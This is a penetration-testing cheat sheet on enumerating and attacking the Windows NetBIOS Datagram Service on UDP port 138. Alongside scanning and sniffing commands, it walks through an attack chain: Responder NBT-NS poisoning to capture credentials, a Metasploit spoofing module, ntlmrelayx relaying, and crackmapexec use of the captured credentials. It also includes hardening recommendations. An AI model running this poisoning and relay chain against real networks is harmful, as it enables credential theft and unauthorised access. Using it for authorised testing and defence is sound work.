# NETBIOS DATAGRAM SERVICE ENUMERATION (Port 138/UDP)

## SERVICE OVERVIEW
```
NetBIOS Datagram Service (NBDS) - Windows datagram broadcasting
- Port: 138/UDP
- Used for broadcasting messages and computer browser announcements
- Connectionless datagram service
- Supports Windows network browsing
- Can be exploited for reconnaissance and MitM attacks
```

## BASIC DETECTION
```bash
# Nmap UDP scan
nmap -sU -p138 <IP>                             # Check if port is open
nmap -sU -p138 --script nbns-interfaces <IP>    # Interface enumeration

# Check if datagram service is active
nc -u <IP> 138                                  # UDP connection test
```

## NETBIOS DATAGRAM TYPES
```
Datagram Types:
- Broadcast datagrams (sent to all nodes)
- Multicast datagrams (sent to group)
- Direct unique datagrams (sent to specific node)
- Direct group datagrams (sent to specific group)

Common uses:
- Browser announcements (host announcements)
- Mailslot messages (administrative messages)
- Computer Browser service communications
- Windows network neighborhood updates
```

## ENUMERATION WITH NMAP
```bash
# NetBIOS datagram enumeration
nmap -sU -p138 --script nbns-interfaces <IP>

# Combined NetBIOS scan (137, 138, 139)
nmap -sU -p137-139 --script nbstat <IP>

# Broadcast NetBIOS discovery
nmap --script broadcast-netbios-master-browser
```

## BROWSER SERVICE ENUMERATION
```bash
# Identify master browser
nmap -sU -p138 --script broadcast-netbios-master-browser --script-args newtargets

# nmblookup for browser service
nmblookup -M -- -                               # Find master browser
nmblookup -d 3 -M -- -                          # Verbose master browser query
```

## MAILSLOT MESSAGES
```bash
# Mailslots are used over NetBIOS Datagram Service
# Common mailslots:
\MAILSLOT\BROWSE                                # Browser service
\MAILSLOT\LANMAN                                # LAN Manager
\MAILSLOT\NET\NETLOGON                          # Domain logon service
\MAILSLOT\NET\NTLOGON                           # NT logon service

# These can reveal:
# - Domain controllers
# - Trusted domains
# - Computer names
# - Logged-on users
```

## RESPONDER (NETBIOS DATAGRAM POISONING)
```bash
# Responder can poison NetBIOS datagram requests
responder -I eth0                               # Basic poisoning
responder -I eth0 -wrf                          # Enable WPAD, responder, force
responder -I eth0 -A                            # Analyze mode (passive)

# Capture credentials via poisoned datagram responses
responder -I eth0 -wrf
# Wait for authentication attempts from Windows hosts
```

## WINDOWS BROWSING ENUMERATION
```bash
# Browser service relies on port 138
# Enumerate computers in workgroup/domain

# net view (Windows)
net view                                        # List computers in domain
net view /domain                                # List domains
net view /domain:<domain_name>                  # List computers in specific domain

# Linux equivalent
nmblookup -M -- -                               # Find master browser
smbclient -L <master_browser> -N                # List shares from master browser
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/netbios/nbname            # NetBIOS name scanner (includes 138)

# NBT-NS spoofing
use auxiliary/spoof/nbns/nbns_response
set INTERFACE eth0
run

# Discover hosts via browser service
use auxiliary/scanner/smb/smb_version
set RHOSTS <subnet>
run
```

## NETBIOS DATAGRAM SNIFFING
```bash
# Capture NetBIOS datagram traffic with tcpdump
tcpdump -i eth0 -n port 138                     # Capture port 138
tcpdump -i eth0 -n udp port 138 -vv             # Verbose output
tcpdump -i eth0 -n udp port 138 -X              # Hex dump

# Wireshark filter
udp.port == 138                                 # Filter NetBIOS datagrams
nbdgm                                           # NetBIOS datagram service filter
```

## COMPUTER BROWSER SERVICE
```bash
# Browser service uses port 138 for announcements
# Computers announce their presence periodically

# Identify master browser
nmblookup -M -- -

# Query browser service
smbclient -L <master_browser> -N                # List all computers

# Force browser election (advanced)
# By sending malicious browser election packets
# This can disrupt network or force re-election
```

## COMMON MISCONFIGURATIONS
```
☐ NetBIOS Datagram Service enabled unnecessarily
☐ No network segmentation (large broadcast domain)
☐ NBT-NS spoofing possible (credentials can be captured)
☐ Computer Browser service revealing network topology
☐ Datagram service accessible from external networks
☐ No monitoring of NetBIOS traffic
☐ Mailslot messages revealing domain info
```

## QUICK WIN CHECKLIST
```
☐ Scan for port 138/UDP (NetBIOS Datagram Service)
☐ Use Responder to poison NBT-NS requests
☐ Identify master browser
☐ Enumerate computers via browser service
☐ Sniff NetBIOS datagram traffic (tcpdump/Wireshark)
☐ Look for mailslot messages revealing domain info
☐ Check if service is exposed externally
☐ Correlate with SMB (139/445) and NetBIOS-NS (137)
```

## ONE-LINER ENUMERATION
```bash
# Quick port 138 check
nmap -sU -p138 <IP> && nmblookup -M -- -

# Subnet scan for NetBIOS datagram service
nmap -sU -p138 --open <subnet> -oG netbios_dgm.txt
```

## SECURITY IMPLICATIONS
```
RISKS:
- Network topology disclosure via browser service
- NBT-NS poisoning leading to credential theft
- Man-in-the-Middle attacks possible
- Domain controller identification
- Computer/user enumeration
- Trust relationship mapping

RECOMMENDATIONS:
- Disable NetBIOS Datagram Service if not needed
- Disable Computer Browser service
- Implement network segmentation
- Use DNS instead of NetBIOS for name resolution
- Disable LLMNR and NBT-NS via Group Policy
- Monitor for NetBIOS poisoning attacks
- Block ports 137-139 at firewall for external traffic
- Enable SMB signing to prevent relay attacks
```

## ADVANCED TECHNIQUES
```bash
# NBT-NS poisoning with relay
# Terminal 1: Responder
responder -I eth0 -wrf

# Terminal 2: ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Browser election manipulation
# Send malicious browser election frames
# Force target to become master browser or disrupt browsing

# Mailslot message injection
# Craft custom mailslot messages for reconnaissance or attacks
```

## TOOLS
```bash
# Responder (poisoning)
git clone https://github.com/lgandx/Responder.git
python Responder.py -I eth0 -wrf

# nmblookup (Samba)
nmblookup -M -- -                               # Find master browser

# Nmap
nmap -sU -p138 --script nbns-interfaces <IP>

# tcpdump / Wireshark
tcpdump -i eth0 -n udp port 138 -vv

# Metasploit
use auxiliary/scanner/netbios/nbname
use auxiliary/spoof/nbns/nbns_response
```

## INTEGRATION WITH ATTACKS
```bash
# Combined NetBIOS attack chain
# 1. Scan ports 137-139
nmap -sU -sS -p U:137-138,T:139,T:445 <subnet>

# 2. Poison NBT-NS (port 138)
responder -I eth0 -wrf

# 3. Relay captured credentials
ntlmrelayx.py -tf targets.txt -smb2support

# 4. Use captured creds for SMB access
crackmapexec smb <target> -u <user> -p <password> --shares
```
